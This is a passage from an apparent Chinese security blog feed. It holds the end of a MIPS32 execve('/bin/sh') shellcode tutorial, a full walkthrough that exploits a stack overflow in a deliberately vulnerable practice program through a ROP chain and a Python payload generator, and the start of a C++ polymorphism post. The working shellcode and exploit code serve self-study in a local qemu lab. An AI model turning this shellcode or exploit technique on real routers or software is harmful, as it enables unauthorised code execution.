&lt;sc&gt;:0x2f0x620x690x6e0x2f0x730x680x00</span><br><span class="line">0x4000f4 &lt;sc+8&gt;:0x000x000x000x000x000x000x000x00</span><br></pre></td></tr></table></figure><p>整理的时候注意对其即可  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">"\x24\x06\x01\x11"</span>    <span class="comment">//lia2,273</span></span><br><span class="line"><span class="string">"\x04\xd0\xff\xff"</span>    <span class="comment">//bltzala2,0x4000d4 &lt;p&gt;</span></span><br><span class="line"><span class="string">"\x24\x06\x00\x00"</span>    <span class="comment">//lia2,0</span></span><br><span class="line"><span class="string">"\x27\xe4\x00\x10"</span>    <span class="comment">//addiua0,ra,16</span></span><br><span class="line"><span class="string">"\x24\x05\x00\x00"</span>    <span class="comment">//lia1,0</span></span><br><span class="line"><span class="string">"\x24\x02\x0f\xab"</span>    <span class="comment">//liv0,4011</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x0c"</span>    <span class="comment">//syscall</span></span><br><span class="line"><span class="string">"\x2f\x62\x69\x6e"</span>    <span class="comment">// "/bin/sh"</span></span><br><span class="line"><span class="string">"\x2f\x73\x68\x00"</span>    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这种写法有个好处，$a0为execve()的第一个参数，随时都可以替换，比较灵活  </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用汇编写点简单的即可掌握，不拘泥的大胆写就好了，有问题就上gdb调  </p><h3 id="Remark"><a href="#Remark" class="headerlink" title="Remark"></a>Remark</h3><p>shellcode.c  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">"\x24\x06\x01\x11"</span>      <span class="comment">//li    a2,273</span></span><br><span class="line"><span class="string">"\x04\xd0\xff\xff"</span>      <span class="comment">//bltzal        a2,0x4000d4 &lt;p&gt;</span></span><br><span class="line"><span class="string">"\x24\x06\x00\x00"</span>      <span class="comment">//li    a2,0</span></span><br><span class="line"><span class="string">"\x27\xe4\x00\x10"</span>      <span class="comment">//addiu a0,ra,16</span></span><br><span class="line"><span class="string">"\x24\x05\x00\x00"</span>      <span class="comment">//li    a1,0</span></span><br><span class="line"><span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">//li    v0,4011</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x0c"</span>      <span class="comment">//syscall</span></span><br><span class="line"><span class="string">"\x2f\x62\x69\x6e"</span>      <span class="comment">// /bin/sh</span></span><br><span class="line"><span class="string">"\x2f\x73\x68\x00"</span>      <span class="comment">//</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">void</span> (*s)(<span class="keyword">void</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"shellcode size is: %d\n"</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        s = shellcode;</span><br><span class="line">        s();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*] work done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近还是在看路由器这本书，里面有讲有关mips32下的Shellcode编写&lt;br&gt;我感觉这个编写思路适合几乎所有的Linux操作系统下的编写，所以也认真的分析和写，故此记录  &lt;/p&gt;
&lt;h3 id=&quot;shellcode&quot;&gt;&lt;a href=&quot;#shellcode&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Simple_mips_stackoverflow</title>
    <link href="http://yoursite.com/2019/11/14/Simple-mips-stackoverflow/"/>
    <id>http://yoursite.com/2019/11/14/Simple-mips-stackoverflow/</id>
    <published>2019-11-14T13:15:53.000Z</published>
    <updated>2019-11-15T03:51:40.457Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看路由器方面的书和文章，故此记录一下;<br>之前学过一段时间的pwn，栈溢出利用也有整理过，有一些不同之处;<br>所以这里总结一下，以后可以回来看看现在的理解的不足之处;  </p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>mips32 big endian, use buildroot + qemu + gdb + IDA  </p><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>,&amp;fileData))</span><br><span class="line">fileLen = fileData.st_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((fp = fopen(<span class="string">"passwd"</span>,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Cannot open file passwd!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count &lt;= fileLen)<span class="comment">//循环读入，漏洞成因，长度可以超过栈上缓冲区</span></span><br><span class="line">&#123;</span><br><span class="line">buf[count++] = ch;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">"adminpwd"</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">"ls -l"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞成因简单，直接编译之后看<br>(由于交叉编译环境或者buildroot中gcc版本的原因，我和书中作者最后的binary不太一样，不过这不重要  </p><h3 id="关注"><a href="#关注" class="headerlink" title="关注"></a>关注</h3><p>循环getc()的程序流开始处:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004005F0</span><br><span class="line">.text:004005F0 loc_4005F0:</span><br><span class="line">.text:004005F0 lw      $v0, 0x1D0+var_1B4($fp)</span><br><span class="line">.text:004005F4 lw      $v1, 0x1D0+var_1B0($fp)</span><br><span class="line">.text:004005F8 sltu    $v0, $v1, $v0</span><br><span class="line">.text:004005FC beqz    $v0, loc_400544</span><br><span class="line">.text:00400600 nop</span><br></pre></td></tr></table></figure><p>漏洞成因是对于输入没有做长度限制，导致可以从文件中读取的长度超过了缓冲区<br>(此处代码观察源代码中的while循环即可理解  </p><p>main()的结尾部分:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004006AC loc_4006AC:</span><br><span class="line">.text:004006AC move    $sp, $fp</span><br><span class="line">.text:004006B0 lw      $ra, 0x1D0+var_4($sp)</span><br><span class="line">.text:004006B4 lw      $fp, 0x1D0+var_8($sp)</span><br><span class="line">.text:004006B8 addiu   $sp, 0x1D0</span><br><span class="line">.text:004006BC jr      $ra</span><br><span class="line">.text:004006C0 nop</span><br></pre></td></tr></table></figure><p>由于main是非叶子函数，在程序流中又可以造成栈溢出，思路自然是栈溢出覆盖0x1D0+var_4($sp)，修改$ra<br>但是和x86_64中的栈溢出类似，mips32采用寄存器传值而非栈，所以mips上的栈溢出需要考虑rop  </p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>采用mipsrop插件进行rop寻找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python&gt; mipsrop.help()</span><br><span class="line"></span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">----------------------</span><br><span class="line">Prints a list of all gadgets that put a stack address into a register.</span><br></pre></td></tr></table></figure><p>通过mipsrop插件寻找所有可以通过栈修改寄存器的rop  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt; mipsrop.stackfinder()</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|Address   |Action                   |Control Jump         |</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|0x00401F80|addiu $a1,$sp,0x58+var_40|jr    0x58+var_4($sp)|</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F80 addiu   $a1, $sp, 0x58+var_40</span><br><span class="line">.text:00401F84 lw      $ra, 0x58+var_4($sp)</span><br><span class="line">.text:00401F88 sltiu   $v0, 1</span><br><span class="line">.text:00401F8C jr      $ra</span><br></pre></td></tr></table></figure><p>do_system_0(int num,char* code)中第二个参数为system(char* code)函数的参数<br>所以这里的addiu $a1,$sp,0x58+var_40刚好符合需求，修改$a1控制第二个参数<br>然后这里的lw      $ra, 0x58+var_4($sp)则用于控制rop链指向直接调用do_system_0()处  </p><h3 id="理论程序流"><a href="#理论程序流" class="headerlink" title="理论程序流"></a>理论程序流</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main()中正常的程序流:</span><br><span class="line">.text:004006AC loc_4006AC:</span><br><span class="line">.text:004006AC move    $sp, $fp</span><br><span class="line">.text:004006B0 lw      $ra, 0x1D0+var_4($sp);修改$ra</span><br><span class="line">.text:004006B4 lw      $fp, 0x1D0+var_8($sp)</span><br><span class="line">.text:004006B8 addiu   $sp, 0x1D0;这里需要注意，内平衡堆栈</span><br><span class="line">.text:004006BC jr      $ra;控制程序流到ROP Chain</span><br><span class="line"></span><br><span class="line">.text:00401F80 addiu   $a1, $sp, 0x58+var_40;这里的$sp是原main()$sp+0x1D0</span><br><span class="line">.text:00401F84 lw      $ra, 0x58+var_4($sp);这里的$sp是原main()$sp+0x1D0</span><br><span class="line">.text:00401F88 sltiu   $v0, 1</span><br><span class="line">.text:00401F8C jr      $ra</span><br><span class="line"></span><br><span class="line">00400658 jal     do_system_0</span><br></pre></td></tr></table></figure><p>需要调试来进行分析$sp  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sp  : 0x7ffff1c8</span><br><span class="line">→   0x4006b8 &lt;main+752&gt;       addiu  sp, sp, 464</span><br><span class="line"></span><br><span class="line">gef➤  s</span><br><span class="line"></span><br><span class="line">$sp  : 0x7ffff398</span><br><span class="line">→   0x4006bc &lt;main+756&gt;       jr     ra</span><br></pre></td></tr></table></figure><p>$rop_sp = $old_sp + 0x1D0<br>但是现在的栈布局是:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 0x19C//padding</span><br><span class="line">($ra)//00401F80,ROP Chain,4 bytes</span><br><span class="line">//这里一共有0x19C+0x4的填充</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">[iot:~/work/programming/vuln_system]$ hexdump passwd </span><br><span class="line">0000000 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">0000190 4141 4141 4141 4141 4141 4141 4000 801f</span><br><span class="line">00001a0</span><br></pre></td></tr></table></figure><p>但千万不要忽略了一个关键点:输入点的开始地址<br>因为不可能从$sp直接开始输入，所以我们需要调试的时候找到padding距$sp的偏移<br>padding = $old_sp + 0x30<br>$old_ra = $old_sp + 0x30 + 0x19C = padding + 0x19C<br>$rop_a1 = $rop_sp + 0x18 = $old_sp + 0x1E8 = padding + 0x1B8<br>$rop_ra = $rop+sp + 0x54 = $old_sp + 0x224 = padding + 0x1F4<br>所以之后的栈布局应该是:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 0x19C//padding</span><br><span class="line">($old_ra)//0x00401F80,ROP Chain,4 bytes</span><br><span class="line">&quot;A&quot; * 0x18//padding</span><br><span class="line">($rop_a1)//&quot;sh&quot; + &quot;\x00&quot; + &quot;\x00&quot;,4 bytes</span><br><span class="line">&quot;A&quot; * 0x38//padding</span><br><span class="line">($rop_ra)//0x00400658,ROP Chain,4 bytes</span><br><span class="line">&quot;B&quot; * 0x4//方便调试</span><br></pre></td></tr></table></figure><p>生成文件的python脚本为:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">shellcode = &quot;A&quot; * 0x19C</span><br><span class="line">shellcode += struct.pack(&quot;&gt;L&quot;, 0x00401F80)</span><br><span class="line">shellcode += &quot;A&quot; * 0x18</span><br><span class="line">shellcode += &quot;sh&quot; + &quot;\x00&quot; + &quot;\x00&quot;</span><br><span class="line">shellcode += &quot;A&quot; * 0x38</span><br><span class="line">shellcode += struct.pack(&quot;&gt;L&quot;, 0x00400658)</span><br><span class="line">shellcode += &quot;B&quot; * 0x4</span><br><span class="line"></span><br><span class="line">fw = open(&apos;passwd&apos;, &apos;w&apos;)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br><span class="line">print &apos;[#] OK!&apos;</span><br></pre></td></tr></table></figure><p>查看一下passwd文件:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[iot:~/work/programming/vuln_system]$ hexdump passwd </span><br><span class="line">0000000 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">0000190 4141 4141 4141 4141 4141 4141 4000 801f</span><br><span class="line">00001a0 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">00001b0 4141 4141 4141 4141 6873 0000 4141 4141</span><br><span class="line">00001c0 4141 4141 4141 4141 4141 4141 4141 4141</span><br><span class="line">*</span><br><span class="line">00001f0 4141 4141 4000 5806 4242 4242          </span><br><span class="line">00001fc</span><br></pre></td></tr></table></figure><p>符合预期  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#shell_one:</span><br><span class="line">qemu-mips -g 1234 vuln_system</span><br><span class="line"></span><br><span class="line">#shell_two:</span><br><span class="line">gdb-multiarch vuln_system</span><br><span class="line">gef➤  target remote 127.0.0.1:1234</span><br><span class="line">gef➤  b *0x004006BC</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">$sp  : 0x7ffff398</span><br><span class="line"></span><br><span class="line"> →   0x4006bc &lt;main+756&gt;       jr     ra</span><br><span class="line">   ↳    0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line">        0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line">        0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">        0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">        0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">        0x401f94                  nop    </span><br><span class="line">//这里程序流为我们所控制的，然后看看接下来的两个寄存器控制情况</span><br><span class="line">$a1  : 0x7ffff3b0  →  0x73680000  →  0x73680000</span><br><span class="line">$pc  : 0x00401f84</span><br><span class="line"></span><br><span class="line">     0x401f78 &lt;isatty+24&gt;      sw     gp, 16(sp)</span><br><span class="line">     0x401f7c &lt;isatty+28&gt;      bal    0x401fa0 &lt;tcgetattr&gt;</span><br><span class="line">     0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line"> →   0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line">     0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">     0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">     0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">     0x401f94                  nop    </span><br><span class="line">     0x401f98                  nop    </span><br><span class="line">gef➤  x /10s 0x7ffff3b0</span><br><span class="line">0x7ffff3b0:&quot;sh&quot;</span><br><span class="line">0x7ffff3b3:&quot;&quot;</span><br><span class="line">0x7ffff3b4:&apos;A&apos; &lt;repeats 56 times&gt;</span><br><span class="line">0x7ffff3ed:&quot;@\006XBBBB&quot;</span><br><span class="line">0x7ffff3f5:&quot;&quot;</span><br><span class="line">0x7ffff3f6:&quot;&quot;</span><br><span class="line">0x7ffff3f7:&quot;&quot;</span><br><span class="line">0x7ffff3f8:&quot;&quot;</span><br><span class="line">0x7ffff3f9:&quot;&quot;</span><br><span class="line">0x7ffff3fa:&quot;&quot;</span><br><span class="line">//ROP Chain中$a1 = &quot;sh&quot;</span><br><span class="line">//然后看看ROP Chain中的$ra</span><br><span class="line">$ra  : 0x00400658  →  0x0c1000dc  →  0x0c1000dc</span><br><span class="line">$pc  : 0x00401f88  →  0x2c420001  →  0x2c420001</span><br><span class="line"></span><br><span class="line">     0x401f7c &lt;isatty+28&gt;      bal    0x401fa0 &lt;tcgetattr&gt;</span><br><span class="line">     0x401f80 &lt;isatty+32&gt;      addiu  a1, sp, 24</span><br><span class="line">     0x401f84 &lt;isatty+36&gt;      lw     ra, 84(sp)</span><br><span class="line"> →   0x401f88 &lt;isatty+40&gt;      sltiu  v0, v0, 1</span><br><span class="line">     0x401f8c &lt;isatty+44&gt;      jr     ra</span><br><span class="line">     0x401f90 &lt;isatty+48&gt;      addiu  sp, sp, 88</span><br><span class="line">     0x401f94                  nop    </span><br><span class="line">     0x401f98                  nop    </span><br><span class="line">     0x401f9c                  nop    </span><br><span class="line">gef➤  x /i $ra</span><br><span class="line">   0x400658 &lt;main+656&gt;:jal0x400370 &lt;do_system&gt;</span><br><span class="line">   0x40065c &lt;main+660&gt;:nop</span><br><span class="line">//完成</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">#shell_one:</span><br><span class="line">[iot:~/work/programming/vuln_system]$ qemu-mips -g 1234 vuln_system </span><br><span class="line">you have an invalid password!</span><br><span class="line">$ ls -la</span><br><span class="line">total 956</span><br><span class="line">drwxr-xr-x 2 iot iot   4096 Nov 14 19:33 .</span><br><span class="line">drwxr-xr-x 6 iot iot   4096 Nov 14 02:33 ..</span><br><span class="line">-rw-r--r-- 1 iot iot    305 Nov 14 19:31 exp.py</span><br><span class="line">-rw-r--r-- 1 iot iot    508 Nov 14 19:31 passwd</span><br><span class="line">-rw------- 1 iot iot  12288 Nov 14 07:29 .swp</span><br><span class="line">-rwxr-xr-x 1 iot iot 133448 Nov 14 06:02 vuln_system</span><br><span class="line">-rw-r--r-- 1 iot iot    699 Nov 14 05:50 vuln_system.c</span><br><span class="line">-rw-r--r-- 1 iot iot 507904 Nov 14 06:50 vuln_system.id0</span><br><span class="line">-rw-r--r-- 1 iot iot 278528 Nov 14 06:03 vuln_system.id1</span><br><span class="line">-rw-r--r-- 1 iot iot    343 Nov 14 06:03 vuln_system.id2</span><br><span class="line">-rw-r--r-- 1 iot iot  16384 Nov 14 06:03 vuln_system.nam</span><br><span class="line">-rw-r--r-- 1 iot iot    315 Nov 14 06:03 vuln_system.til</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里有两个方面需要加强供以后的我回顾:<br>1.更加熟练的推测+测试padding的长度<br>2.ROP Chain的利用熟练</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在看路由器方面的书和文章，故此记录一下;&lt;br&gt;之前学过一段时间的pwn，栈溢出利用也有整理过，有一些不同之处;&lt;br&gt;所以这里总结一下，以后可以回来看看现在的理解的不足之处;  &lt;/p&gt;
&lt;h3 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerl
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Virtual function and Polymorphism</title>
    <link href="http://yoursite.com/2019/09/23/Virtual-function-and-Polymorphism/"/>
    <id>http://yoursite.com/2019/09/23/Virtual-function-and-Polymorphism/</id>
    <published>2019-09-23T04:17:41.000Z</published>
    <updated>2019-09-25T18:44:04.757Z</updated>
    
    <content type="html"><![CDATA[<p>因为看懂大型项目的源码有困难，所以最近在看一些有关设计模式方面的知识;<br>在看简单工厂模式的时候遇到了以前所忽视的一些问题;  </p><h3 id="Object-Oriented-Programming"><a href="#Object-Oriented-Programming" class="headerlink" title="Object Oriented Programming"></a>Object Oriented Programming</h3><p>面向对象编程的三大特征：<br>1.封装;<br>2.继承;<br>3.多态;<br>封装和继承在之前使用PHP的时候经常使用，并尝到了不少甜头;<br>但是我对于多态的理解仅仅局限于类中的函数有多种形态这个字面理解;<br>然而在简单工厂模式中又实际使用到了，正是学习的好机会;  </p><h3 id="Virtual-function"><a href="#Virtual-function" class="headerlink" title="Virtual function"></a>Virtual function</h3><p>Cpp中有一个virtual关键字，一般情况下是用于虚函数和虚基类;<br>(其实看到virtual的第一反应是virtual machine…<br>而在实际的代码中是在一个基类中的一个函数定义里看到的;<br>所以我看了不少的师傅的博客之后自己写了一个简单的来理解;<br>但是详细的内容介绍参考：<br><a href="http://www.cplusplus.com/doc/tutorial/polymorphism/" target="_blank" rel="noopener">Polymorphism</a><br><a href="https://www.geeksforgeeks.org/virtual-function-cpp/" target="_blank" rel="noopener">Virtual Function in C++</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 